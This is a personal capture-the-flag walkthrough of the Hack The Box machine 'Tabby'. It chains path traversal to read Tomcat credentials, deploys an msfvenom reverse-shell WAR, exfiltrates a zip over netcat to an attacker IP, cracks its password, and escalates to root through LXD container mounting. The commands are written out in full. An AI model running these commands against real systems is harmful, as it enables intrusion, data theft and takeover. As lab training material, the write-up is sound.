# 🐱‍💻 Tabby

#htb-easy #apache-tomcat #linux_priv_escalation #path-traversal

>[!info] 
>This box was really difficult confusing and there's no way I would have been able to complete it without the guides I used (I don't think).
>
>It took me ~2hr30mins with the use of the guides half way through.

---

# Initial Nmap Scan

```
sudo nmap -p- 10.129.194.239
```

```
sudo nmap -p 22,80,8080 -sCV 10.129.194.239
```

\# output of the nmap scans:

![[Pasted image 20240301155816.png]]

This showed three open ports:
- Port 22 running OpenSSH 8.2p1 Ubuntu 4
- Port 80 running Apache httpd 2.4.41
- Port 8080 running Apache Tomcat

I had to google what Apache Tomcat was and how it compared to the Apache I new about:

> "- The Apache server is an HTTP web server, while the Apache Tomcat server is mainly a Java application server.
> - Tomcat is written in Java, while Apache is written in C.
> - Tomcat is used to serve dynamic content such as Java Servlets and JSP files, while Apache is used to serve static content."
>
> \-[Apache Server vs Apache Tomcat](https://www.crestinfotech.com/difference-between-an-apache-server-and-a-tomcat-server/#:~:text=The%20Apache%20server%20is%20an,used%20to%20serve%20static%20content.)

## Apache Server - Port 80

Putting the target IP address into Firefox takes you to a website about hosting services.

\# Visiting `<target_ip` in Firefox

![[Pasted image 20240301160825.png]]

Hovering over the different links, you can see where they take you without having to actually click. Hovering over "news" shows an interesting link that includes a file in the URL:

![[Pasted image 20240301163542.png]]

I started googling for things about when a URL includes `file=` and I came across two things:
- Local File Inclusion
- Directory Path Traversal

[Directory Traversal](https://www.imperva.com/learn/application-security/directory-traversal/)

After some more googling I found out that this url can be changed and `view-source:` can be prefixed in order to view files that may not be accessible in the normal browser view - (*useful later on*)

## Apache Tomcat - Port 8080

Putting the target IP address followed by `:8080` takes you to Apache Tomcat. While scanning this page, the bottom line is interesting where it says:

> "Users are defined in `/etc/tomcat9/tomcat-users.xml"

This made me think it would be possible to find this file and therefore find some user credentials to use to log into the Tomcat manager.

![[Pasted image 20240301160931.png]]

## Accessing Credentials

The two details from both websites can now be put together. I discovered that changing this `news` URL can then display the `tomcat-users.xml` file that was mentioned on the Apache Tomcat:

![[Pasted image 20240301172133.png]]

After googling I found out that the default location for this file is: `/usr/share/tomcat9/etc/tomcat-users.xml`. It was a bit of trial and error to find this on this instance of Apache Tomcat but it just involved experimenting with the amount of "go up a directory's" - `/../`:

 The `tomcat-users.xml` file can be displayed using:

```
view-source:http://10.129.194.244/news.php?file=/../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

![[Pasted image 20240301172435.png]]

I can try and use this username and password combo to login to the Apache Tomcat manager.

```
tomcat:$3cureP4s5w0rd123!
```

## Tomcat Manager

The credentials do not work the Manager:

![[Pasted image 20240301172927.png]]

## Tomcat Host Manager

However, the credentials do work for the Host Manager:

![[Pasted image 20240301173120.png]]

>[!info]- This is where I got stuck and began to rely on the guides I found
>
>From here on my notes are just rewritten / modified versions of the things I found in the two writeups I began using.

## Creating a Reverse Shell

A reverse shell can be created using a `.war` file. Usually in Tomcat a user can upload one using the web GUI but this is not the case for this box.

\# Generating the `.war` file:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=1234 -f war > shell.war
```

\# Uploading the payload (the `.war file):

```
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.129.194.244:8080/manager/text/deploy?path=/my-shell'
```

\# Check the payload is uploaded:

```
curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.129.194.244:8080/manager/text/list
```

You can now see that the `.war` file I created and uploaded is listed as a running application:

![[Pasted image 20240301181537.png]]

Now an Ncat listener can be started on our attacker machine to listen for the incoming connection in order to receive the reverse shell:

\# Start Ncat listener:

```
nc -lnvp 1234
```

> Note: The nc listener port should be the same as the port specified when the `.war` was created - in this case it was `1234`

\# Execute the payload:

```
curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.129.194.244:8080/my-shell/
```

As you can see the payload execute and connected to the Ncat listener - I now have a reverse shell as user `tomcat`:

![[Pasted image 20240301182157.png]]

### Upgrade the Shell

The shell can be upgraded with the following commands:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
CTRL+Z # to background the session
stty raw -echo
fg # then [ENTER] x2 
```

---

# 🤯 User Own

I now have a shell on the Apache Tomcat machine as user: `tomcat`. However, I need to find a way to retrieve the user `ash`'s flag. This means enumerating the machine and finding a way to swap users.

Looking around the file system uncovers a file located at `/var/www/html/files` with the file name `16162020_backup.zip` which is owned by `ash` (found using `ls -l`) This file can be copied to elsewhere but then requires a password to unzip it.

\# Backup file requires a password:

![[Pasted image 20240301183745.png]]

## Exfiltrating the file

Before exfiltrating the file, the hash can be checked in order to compare against the one we receieve

\# Getting hash value of orginal file on `tomcat@tabby`:

```
md5sum 16162020_backup.zip
```

\# Start Ncat listener to receive file:

```
nc -lnvp 1500 > 16162020_backup.zip
```

\# Sending the file

```
cat 16162020_backup.zip | nc 10.10.14.3 1500
```

\# Reiving the file on Ncat

![[Pasted image 20240301184603.png]]

As you can see both hash values match so the file was exfiltrated successfully.

![[Pasted image 20240301184525.png]]

## Cracking the File Password

Cracking the password can be done using the utility: `fcrackzip` and the command is:

```
fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
```

Another method involves using `zip2john` and `john`:
1. Create a hash
2. Pass to John

```
zip2john 16162020_backup.zip > 16162020_backup.zip.john
john 16162020_backup.zip.john --wordlist=/usr/share/wordlists/rockyou.txt
```

\# Using `fcrackzip`

![[Pasted image 20240301184844.png]]

\# using john

![[Pasted image 20240301185255.png]]

There was nothing useful inside the archive but the found password turned out to be `ash`'s password so I could switch users to him now.

\# Switching to Ash

```
su - ash
```

\# user.txt flag

![[Pasted image 20240301185757.png]]

---

# 🖥 System Own

This now involved some privileged escalation and there is no way I would have been able to complete this without the guides.

The privilege escalation is done using an LXC exploitation:

[This](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1) post says "It is well-known that if you gain RCE as a user in the lxd group you can quite easily escalate your privileges to that of root."

Doing the command `id` while as the user `ash` I can see that s/he is infact in the `lxd` group:

![[Pasted image 20240301190328.png]]

LXC exploitation is done by creating a container and then mounting the full root file system on the target machine into that container - giving full access to it.

## Escalate Privilege with LXD

\# Download `build-alpine` to attacker machine from github repo

```
git clone https://github.com/saghul/lxd-alpine-builder.git
```

\# change directory

```
cd lxd-alpine-builder
```

\# execute the script to build alpine using root privileges

```
sudo ./build-alpine
```

![[Pasted image 20240301192041.png]]

\# `ls` to show that the `.tar.gz` package has been created

![[Pasted image 20240301192421.png]]

This `tar.gz` package contains the files necessary to make an Alpine Linux container. This file now needs to be transferred to the Tabby host machine.

This is done by running a webserver so that the Tabby machine can get the file from me:

\# Creating a Python webserver on my attacker machine

```
python3 -m http.server 2000
```

![[Pasted image 20240301193046.png]]

\# Tabby machine downloading the `tar.gz` package:

```
wget 10.10.14.3:2000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

![[Pasted image 20240301193112.png]]

Trying to import the image into `lxc` now throws an error and suggests that we first need to run `lxd init` in order to fix this:

![[Pasted image 20240301193418.png]]

When running `lxd init` just allow all default values by pressing `[ENTER]`.

I tried running the `lxc image import` again but I still received the error: `Error: open ./alpine-v3.12-x86_64-20200625_0040.tar.gz: no such file or directory`

I now realised that I had copied the import command from the guide I am following and neglected to change the name of the `.tar.gz` package to the name of the package that I have created (rather than the name in the guide). 

\# Importing the image into `lxc`

```
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias whiskeyneat
```

The import is now successful:

![[Pasted image 20240301194134.png]]

\# Create a container from the image

```
lxc init whiskeyneat hackthebox -c security.privileged=true
```

\# Mount part the host file system

```
lxc config device add hackthebox device-htb disk source=/ path=/mnt/root
```

\# The container is ready:

![[Pasted image 20240301194954.png]]

\# Start the container:

![[Pasted image 20240301195126.png]]

\# `lxc exec` returns a root shell inside the container:

```
lxc exec hackthebox /bin/sh
```

![[Pasted image 20240301195253.png]]

This shell is inside the container:

![[Pasted image 20240301195419.png]]

So in order to find the root flag I need to move into the mounted part using:

```
cd /mnt/root
```

Now I can cd into `/root` and find the `root.txt` file:

![[Pasted image 20240301195549.png]]

---

# 🔗 Useful Links

- [Apache Tomcat 9 Documentation](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)
- Writeup Used: [ethicalhacs | Tabby Writeup](https://ethicalhacs.com/tabby-hackthebox-walkthrough/)
- Writeup Used: [0xdf | Tabby Writeup](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html)
- Info / Guide for LXD: [LXD Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/)
- An alternative method for escalation: [LXC Container Privilege Escalation in More Restrictive Environments](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1)
